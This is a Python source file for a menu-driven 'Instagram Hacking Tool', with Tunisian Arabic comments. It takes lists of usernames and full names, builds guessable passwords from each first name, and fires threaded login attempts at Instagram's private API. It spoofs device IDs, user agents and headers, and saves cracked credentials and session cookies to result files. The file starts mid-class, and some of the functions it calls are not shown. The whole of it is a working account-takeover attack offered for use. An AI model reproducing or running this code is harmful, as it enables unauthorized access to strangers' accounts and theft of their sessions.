        print(f"     {Fore.CYAN}{Style.BRIGHT}    │        𝚁𝚊𝚢𝚎𝚗-𝐙𝐞𝐫𝐨-𝐓𝐫𝐚𝐜𝐞         │ {Style.RESET_ALL}")
        print(f"    {Fore.CYAN}{Style.BRIGHT}     ├───────────────────────────────┤{Style.RESET_ALL} ")
        print(f"     {Fore.CYAN}{Style.BRIGHT}    │      𝚆𝚎𝚕𝚌𝚊𝚖𝚎  : 𝐒𝐭𝐚𝐲 𝐇𝐚𝐫𝐝       │ {Style.RESET_ALL} ")
        print(f"     {Fore.CYAN}{Style.BRIGHT}    └───────────────────────────────┘{Style.RESET_ALL} \n")

    def read_input_file(self, file_path):
        global internal
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()
                for line in lines:
                    line = line.strip()
                    if line:
                        internal.append(line)
        except FileNotFoundError:
            print(f"[ERROR]   ماتعرفش تكتب مسار ملف")
            exit()
        except Exception as e:
            print(f"[ERROR]   ماتعرفش تكتب مسار ملف")
            exit()

    def passwordAPI(self, xnx):
        self.generateAPI(xnx)

#🆕
    def generateAPI(self, user):
        from concurrent.futures import ThreadPoolExecutor
        import random  # إضافة مكتبة random لhhخلط! كلمات المرور
        with ThreadPoolExecutor(max_workers=14) as shinkai:
            for i in tqdm(user, desc=f""):
                try:
                    username = i.split("|")[0].strip()
                    name = i.split("|")[1].split()[0].lower()
                    sandi = [ name + '123', name + name]
                    random.shuffle(sandi)  # خلط قائمة كلمانت المرور بشكل عشوائي
                    shinkai.submit(self.crackAPI, username, sandi)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error processing {i}: {str(e)}{Style.RESET_ALL}")
                    global loop
                    loop += 1
                    continue
        print(f"\n{Fore.WHITE}[•] CRACKING COMPLETED: OK={len(success)}, CP={len(checkpoint)}{Style.RESET_ALL}")
        self.s.close()  # إغلاق الجلسة
        exit()

    def crackAPI(self, user, pas):
        global loop, success, checkpoint
        try:
            for pw in pas:
                KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:6]}/{len(internal)}/[bold green]{len(success)}[/bold green]/[bold yellow]{len(checkpoint)}[/bold yellow]/{loop}[/]', end='\r')  
                sys.stdout.flush()
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                android_id = 'android-' + self.helper.generate_android_id(user, pw)
                mid = self.helper.get_random_machine_id()
                pigeon_session_id = f'UFS-{str(uuid.uuid4())}-3'
                pigeon_rawclienttime = '{:.3f}'.format(time.time())
                bandwidth_speed = str(random.randint(100, 999))
                bandwidth_totalbytes = str(random.randint(2000, 5000))
                bandwidth_totaltime = str(random.randint(500, 4000))
                bloks_version_id = self.helper.get_random_block_id()
                fb_connection_type, ig_connection_type = self.helper.UseNet()
                
                user_agent = UserAgent().instagram_app()
                headers = {
                    "Host": "i.instagram.com",
                    "X-Ig-App-Locale": "fr_FR",
                    "X-Ig-Device-Locale": "fr_FR",
                    "X-Ig-Mapped-Locale": "ar_AR",
                    "X-Pigeon-Session-Id": pigeon_session_id,
                    "X-Pigeon-Rawclienttime": pigeon_rawclienttime,
                    "X-Ig-Bandwidth-Speed-Kbps": bandwidth_speed,
                    "X-Ig-Bandwidth-Totalbytes-B": bandwidth_totalbytes,
                    "X-Ig-Bandwidth-Totaltime-Ms": bandwidth_totaltime,
                    "X-Bloks-Version-Id": bloks_version_id,
                    "X-Ig-Www-Claim": "0",
                    "X-Bloks-Prism-Button-Version": "CONTROL",
                    "X-Bloks-Prism-Colors-Enabled": "false",
                    "X-Bloks-Prism-Ax-Base-Colors-Enabled": "false",
                    "X-Bloks-Prism-Font-Enabled": "false",
                    "X-Ig-Attest-Params": json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[-1004],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}),
                    "X-Bloks-Is-Layout-Rtl": "false",
                    "X-Ig-Device-Id": device_id,
                    "X-Ig-Family-Device-Id": family_device_id,
                    "X-Ig-Android-Id": android_id,
                    "X-Ig-Timezone-Offset": str(self.helper.get_timezone_offset()),
                    "X-Ig-Nav-Chain": "com.bloks.www.caa.login.aymh.screen_query:com.bloks.www.caa.login.aymh.screen_query:1:button:1742335401.917::",
                    "X-Fb-Connection-Type": fb_connection_type,
                    "X-Ig-Connection-Type": ig_connection_type,
                    "X-Ig-Capabilities": "3brTv10=",
                    "X-Ig-App-Id": "567067343352427",
                    "Priority": "u=3",
                    "User-Agent": user_agent,
                    "Accept-Language": "fr-FR,ar-AR;q=0.9",
                    "X-Mid": mid,
                    "Ig-Intended-User-Id": "0",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "X-Fb-Http-Engine": "Liger",
                    "X-Fb-Client-Ip": "True",
                    "X-Fb-Server-Cluster": "True",
                    "X-Csrftoken": self.csrf_token
                }
                data = {
                    'params': json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": "",
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{pw}",
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "",
                            "device_id": android_id,
                            "login_attempt_count": 1,
                            "machine_id": mid,
                            "accounts_list": [],
                            "family_device_id": family_device_id,
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": "", "lara_override": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": "",
                            "openid_tokens": {},
                            "contact_point": user
                        },
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": None,
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": None,
                            "is_from_landing_page": 0,
                            "password_text_input_id": "ofmgp5:146",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "ofmgp5:145",
                            "layered_homepage_experiment_group": None,
                            "should_show_nested_nta_from_aymh": 1,
                            "device_id": None,
                            "INTERNAL__latency_qpl_instance_id": random.random() * 1e14,
                            "reg_flow_source": "cacheable_aymh_screen",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": None,
                            "is_from_assistive_id": 0,
                            "access_flow_version": "LEGACY_FLOW",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    'bk_client_context': json.dumps({
                        "bloks_version": bloks_version_id,
                        "styles_id": "instagram"
                    }),
                    'bloks_versioning_id': bloks_version_id
                }
                try:
                    x = self.s.post(insta_log, headers=headers, data=data, timeout=10)
                except requests.RequestException as e:
                    time.sleep(0.5)
                    continue
                
                # تقييد النص إلى أول 10000 حرف (يمكن تغيير القيمة حسب الحاجة)
                
                response_text = x.text[:15000]  # قصر النص على أول 10000 حرف
                
                try:
                    x_jason = json.loads(x.text)  # تحليل الاستجابة الكاملة إلى bJSON
                    
                except json.JSONDecodeError:
                    time.sleep(0.5)
                    continue

                # البحث في النص المقيد (response_text) بدلاً من النص الكامل
                if "logged_in_user" in response_text or "userId" in response_text:
                    print(f"\n{Fore.GREEN}[OK] Success{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}├── Username: {user}{Style.RESET_ALL} ")
                    print(f"{Fore.GREEN}├── Password: {pw}{Style.RESET_ALL}")
 
                    open(f"result/success_accounts.txt", "a").write(f"""@.   [success_accounts.txt] Checkpoint
├── Username: {user}
├── Password: {pw}

""")
                    success.append(user)
                    loop += 1
                    break

                elif 'Impossible d’enregistrer vos informations de connexion' in response_text:
                    print(f"\n{Fore.YELLOW}.   [Impossible d’enregistrer vos informations de connexion] Checkpoint{Style.RESET_ALL} ")
                    success.append(user)
                    print(f"\n{Fore.GREEN}[OK] Success{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}├── Username: {user}{Style.RESET_ALL} ")
                    print(f"{Fore.GREEN}├── Password: {pw}{Style.RESET_ALL}")
                    open(f"result/success_accounts.txt", "a").write(f"""@.   [success_accounts.txt] Checkpoint
├── Username: {user}
├── Password: {pw}


""")
                    break#&-
                elif 'redirect_login_challenges' in response_text or 'CAA_LOGIN_FORM:acc#ount_list' in response_text:
                    
                    checkpoint.append(user)
                    print(f"\n{Fore.YELLOW}.   [redirect_login_challenges] redirect_login_challenges{Style.RESET_ALL} ")
                    print(f"{Fore.YELLOW}├── Username: {user}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}├── Password: {pw}{Style.RESET_ALL} ")
                    print(f"{Fore.YELLOW}├── user agent : {user_agent}{Style.RESET_ALL} ")
                    print(f"{Fore.YELLOW}└── Cookies: Mid: {self.mid} | csrftoken: {self.csrf_token}{Style.RESET_ALL}")
                    open(f"result/challenge_accounts.txt", "a").write(f"""@.   [challenge_required] Checkpoint
├── Username: {user}
├── Password: {pw}

""")
                    break
                elif "challenge_required" in response_text:

                    checkpoint.append(user)
                    print(f"\n{Fore.YELLOW}.   [challenge_required] Checkpoint{Style.RESET_ALL} ")
                    print(f"{Fore.YELLOW}├── Username: {user}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}├── Password: {pw}{Style.RESET_ALL} ")
                    
                    print(f"{Fore.YELLOW}├── user agent : {user_agent}{Style.RESET_ALL} ")
                    print(f"{Fore.YELLOW}└── Cookies: Mid: {self.mid} | csrftoken: {self.csrf_token}{Style.RESET_ALL}")
                    open(f"result/challenge_accounts.txt", "a").write(f"""@.   [challenge_required] Checkpoint
├── Username: {user}
├── Password: {pw}

""")
                    break
                else:
                    time.sleep(2)
                    continue
            else:
                loop += 1
        except Exception as e:
            print(f"{Fore.RED}[!] Error checking {user}: {str(e)}{Style.RESET_ALL}")
            time.sleep(2)
            loop += 1


    def Exit(self):
        print(f" شر عصبة مالا راس")
        exit()
##
    def menu(self):
        self.banner()
        print(f"» \033[1;33m1\033[0m - \033[1;41m  𝙲𝚛𝚊𝚌𝚔𝚒𝚗𝚐 𝚏𝚒𝚕𝚎 𝚅1 [ \033[1;32m𝚗𝚎𝚠 \033[0m\033[1;41m𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ]   ㋛︎ \033[0m\n")
        print(f"» \033[1;33m2\033[0m - \033[1;41m  𝙲𝚛𝚊𝚌𝚔𝚒𝚗𝚐 𝚏𝚒𝚕𝚎 𝚅2 [ {Fore.CYAN}𝚘𝚕𝚍 \033[0m\033[1;41m𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ]   ㋛︎ \033[0m\n")
        print(f"» \033[1;33m3\033[0m - \033[1;41m  𝙲𝚛𝚊𝚌𝚔𝚒𝚗𝚐 𝚏𝚒𝚕𝚎 𝚅3 [ {Fore.CYAN}𝙱𝚛𝚘𝚠𝚜𝚎𝚛 \033[0m\033[1;41m𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ]   ㋛︎ \033[0m\n")
        print(f"» \033[1;33m4\033[0m - \033[1;41m  𝙲𝚛𝚊𝚌𝚔𝚒𝚗𝚐 𝚏𝚒𝚕𝚎 𝚅4 [ {Fore.CYAN}𝚂𝚞𝚙𝚎𝚛 𝚂𝚖𝚊𝚛𝚝 \033[0m\033[1;41m𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ]   ㋛︎ \033[0m\n")
        print(f"» \033[1;33m0\033[0m -  ︎︎       ⠀⠀⠀  \033[1;46m   𝙴𝚡𝚒𝚝   ✔︎︎︎︎ \033[0m\n")
        c = input('\033[1;91m      ➛\033[1;92m   ')
        if c == '':
            self.menu()
        elif c in ('1', '01'): 
            self.clear()
            print("\033[1;36m              =====================================")
            print("\033[1;33m                  𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝚊𝚝𝚝𝚊𝚌𝚔 𝚗𝚎𝚠 𝚟𝚎𝚛𝚜𝚒𝚘𝚗𝚜        ")
            print("\033[1;36m              =====================================\n")
            file_path = input(f'{CY}[•] 𝚏𝚒𝚕𝚎 𝙻𝚘𝚌𝚊𝚝𝚘𝚒𝚗 🗃️➛  ')
            self.read_input_file(file_path)
            self.passwordAPI(internal)
        elif c in ('2', '02'):
            self.clear()
            print("\033[1;36m              =====================================")
            print("\033[1;33m                  𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝚊𝚝𝚝𝚊𝚌𝚔 𝚘𝚕𝚍 𝚟𝚎𝚛𝚜𝚒𝚘𝚗𝚜        ")
            print("\033[1;36m              =====================================\n")
            file_path = input(f'{CY}[•] 𝚏𝚒𝚕𝚎 𝙻𝚘𝚌𝚊𝚝𝚘𝚒𝚗 🗃️➛  ')
            start_hack(file_path)
            
            
        elif c in ('3', '03'):
            self.clear()
            print("\033[1;36m              =====================================")
            print("\033[1;33m                  𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝚊𝚝𝚝𝚊𝚌𝚔 𝙱𝚛𝚘𝚠𝚜𝚎𝚛         ")
            print("\033[1;36m              =====================================\n")
            file_path = input(f'{CY}[•] 𝚏𝚒𝚕𝚎 𝙻𝚘𝚌𝚊𝚝𝚘𝚒𝚗 🗃️➛  ')
            self.read_input_file1(file_path)
            self.passwrd1()
        elif c in ('4', '04'):
            self.clear()
            print("\033[1;36m              =====================================")
            print("\033[1;33m                  𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝚊𝚝𝚝𝚊𝚌𝚔 𝚂𝚞𝚙𝚎𝚛 𝚂𝚖𝚊𝚛𝚝         ")
            print("\033[1;36m              =====================================\n")
            filepath = console.input("[cyan]Enter the path to the accounts file (username|password): [/cyan]")
            self.import_accounts(filepath)
            self.launch_attack()
        elif c in ('0', '00'):
            self.Exit()
        else:
            self.menu()



#::
import json
import random  # إضافة مكتبة random لاستخدام shuffle
import requests
import os
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor as Executor
from colorama import Fore, Style, init

try:
    init(autoreset=True)
except ImportError as e:
    print(f'{Fore.RED}[!] Module {e} is not installed. Please install it using `pip install {e}`{Style.RESET_ALL}')
    exit(1)

class User1Agent:
    def __init__(self):
        self.kode_list = ['145652090', '206670917', '185203686', '192992561', '183982986', '206670927', '150338061',
        '240726452', '239490551', '239490548', '240726426', '240726476', '240726491']
        self.kode = random.choice(self.kode_list)
        self.devices = [
            {"brand": "Huawei", "model": "Nova 5T", "code": "YAL-L21", "chip": "kirin980", "dpi": "360dpi", "res": "720x1600", "android": "29/10"},
            {"brand": "Samsung", "model": "Galaxy Note 20", "code": "c1q", "chip": "exynos990", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
            {"brand": "Xiaomi", "model": "Redmi 9T", "code": "joyeuse", "chip": "qcom", "dpi": "420dpi", "res": "1080x2400", "android": "30/11"},
            {"brand": "Huawei", "model": "P30 Lite", "code": "MAR-LX1", "chip": "kirin710", "dpi": "360dpi", "res": "720x1600", "android": "29/10"},
            {"brand": "Samsung", "model": "Galaxy A51", "code": "a51", "chip": "exynos9611", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
            {"brand": "OnePlus", "model": "OnePlus 7", "code": "hotdog", "chip": "qcom", "dpi": "420dpi", "res": "1080x2400", "android": "30/11"},
        ]
        self.versions = [v.strip() for v in "70.0.0.15.98, 80.0.0.20.101, 60.0.0.10.76, 85.0.0.25.100, 75.0.0.22.99, 72.0.0.18.94, 68.0.0.16.84, 78.0.0.14.97, 63.0.0.20.81, 81.0.0.24.105, 73.0.0.16.96, 67.0.0.18.88, 84.0.0.21.110, 74.0.0.18.100, 71.0.0.15.92, 79.0.0.14.103, 62.0.0.18.80, 87.0.0.22.115, 76.0.0.20.102, 83.0.0.18.10, 66.0.0.16.87, 88.0.0.24.118, 77.0.0.22.103, 64.0.0.18.82, 82.0.0.20.107, 69.0.0.14.92, 89.0.0.20.123, 61.0.0.14.76, 86.0.0.18.112, 65.0.0.12.86".split(",")]

    def instagram_app(self):
        device = random.choice(self.devices)
        version = random.choice(self.versions)
        ua_template = "Instagram {version} Android ({android}; {dpi}; {res}; {brand}; {model}; {code}; {chip}; fr_TN; {kode})"
        return ua_template.format(
            version=version,
            android=device["android"],
            dpi=device["dpi"],
            res=device["res"],
            brand=device["brand"],
            model=device["model"],
            code=device["code"],
            chip=device["chip"],
            kode=self.kode
        )

class requ:
    def Signature(self, data, body='SIGNATURE'):
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))

    def DeviceId(self):
        return f"android-{uuid.uuid4().hex[:16]}"

    def guid(self):
        return str(uuid.uuid4())

    def poid(self):
        return str(uuid.uuid4())

    def adid(self, username):
        return str(uuid.uuid4())

#🆕11
def generate_passwords(full_name):
    first_name = full_name.split()[0].lower()
    passwords = [
        f"{first_name}11", f"{first_name}12", f"{first_name}123", f"{first_name}1234",
        f"{first_name}12345", f"{first_name}123456", f"{first_name}123457", f"{first_name}12345789",
        f"{first_name}{first_name}", f"{first_name}12345678", f"{first_name}123123",
        f"{first_name}@123", f"{first_name}#123", f"{first_name}{first_name}123"
    ]
    random.shuffle(passwords)  # خلط القائمة بشكل عشوائي
    return passwords

#&&
def try_login(acc):
    global loop, success, checkpoint
    loop += 1
    try:
        username, full_name = acc.split("|")
    except:
        return

    passwords = generate_passwords(full_name)
    for pswd in passwords:
        if not pswd:
            continue
        try:
            session = requests.Session()
            useragent_generate = User1Agent().instagram_app()
            guid = requ().guid()
            device_id = requ().DeviceId()
            phone_id = requ().poid()

            headers_fetch = {
                'User-Agent': useragent_generate,
                'Accept': '*/*',
                'Accept-Language': 'fr-TN',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Capabilities': '36r/dw==',
                'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                'X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps',
                'Connection': 'keep-alive',
                'X-IG-WWW-Claim': '0'
            }

            resp = session.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=' + guid, headers=headers_fetch)
            csrftoken = resp.cookies.get("csrftoken", "")
            mid = resp.cookies.get("mid", "")

            if not mid:
                mid_headers = headers_fetch.copy()
                mid_headers['Cookie'] = f'csrftoken={csrftoken};dpr=2'
                resp_mid = session.get('https://i.instagram.com/api/v1/web/get_ruling_for_content/', headers=mid_headers)
                mid = resp_mid.cookies.get("mid", "")

            data = json.dumps({
                'phone_id': phone_id,
                'device_id': device_id,
                'guid': guid,
                'username': username,
                'password': pswd
            })

            headers = {
                'Authority': 'i.instagram.com',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps',
                'Accept': '*/*',
                'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                'X-IG-App-ID': '936619743392459',
                'Accept-Language': 'fr-TN',
                'X-IG-ABR-Connection-Speed-KBPS': '199',
                'User-Agent': useragent_generate,
                'Connection': 'keep-alive',
                'X-IG-Capabilities': '36r/dw==',
                'X-IG-WWW-Claim': '0',
                'Cookie': f'csrftoken={csrftoken};mid={mid};dpr=2'
            }

            cookies = {'csrftoken': csrftoken, 'mid': mid}
            session.headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
            resp_data = requ().Signature(data)

            response = session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=resp_data,
                headers=headers,
                cookies=cookies
            )

            if 'logged_in_user' in response.text:
                cookie = ';'.join(['%s=%s'%(name,value) for name, value in session.cookies.get_dict().items()])
                success.append(f"{username}:{pswd}")
                with open('result/success_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{username} | {pswd}\n{cookie}\n\n')
                print(f'\r\033[1;92m\n\n[1;92m                     \n\n   🆔 :|     {username}       🔑 :|     {pswd} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{cookie}\n\n ')
                break

            elif 'challenge_required' in response.text or 'checkpoint' in response.text or 'challenge' in response.text:
                checkpoint.append(f"{username}:{pswd}")
                with open('result/challenge_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{username} | {pswd} | \n\n')
                print(f'\r\033[1;33m└──[𝙶𝚊𝚖𝚘𝚞𝚍𝚒-𝐂𝐏] {username} | {pswd}        \n 𝚌𝚛𝚜𝚏𝚝𝚘𝚔𝚎𝚗 : {csrftoken} \n 𝚖𝚒𝚍 : {mid}\n 𝚄𝚜𝚎𝚛-𝙰𝚐𝚎𝚗𝚝 : {useragent_generate} \n\n  ')
                break

            progress = int((loop / len(accounts)) * 20)
            bar = '\033[1;32m█' * progress + '\033[1;37m-' * (20 - progress)
            print(f'\r\033[1;36m[{bar}] {loop}/{len(accounts)} OK:\033[1;32m{len(success)} \033[1;36mCP:\033[1;33m{len(checkpoint)}', end='')
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            print(f'\r\033[1;31m[ERROR] {username} | {pswd} | {str(e)}')
        finally:
            session.close()

def banne1r():
    print("\033[1;36m=====================================")
    print("\033[1;33m       Instagram Hacking Tool        ")
    print("\033[1;36m=====================================")

def start_hack(file_path):
    global accounts, success, checkpoint, loop, OK_FILE, CP_FILE

    if not os.path.exists(file_path):
        print(f"[ERROR]   ماتعرفش تكتب مسار ملف")
        return

    accounts = [line.strip() for line in open(file_path,'r').readlines() if '|' in line]
    success = []
    checkpoint = []
    loop = 0

    with Executor(max_workers=14) as executor:
        executor.map(try_login, accounts)

    print(f"\n[تم الانتهاء] | OK: {len(success)} | CP: {len(checkpoint)}")
    input("\n\033[1;36mاضغط Enter للعودة إلى القائمة...")
# Run the program-اتع

# --- الكود الرئيسي ---ات
if __name__ == '__main__':
    ig = Instagram()
    ig.menu()
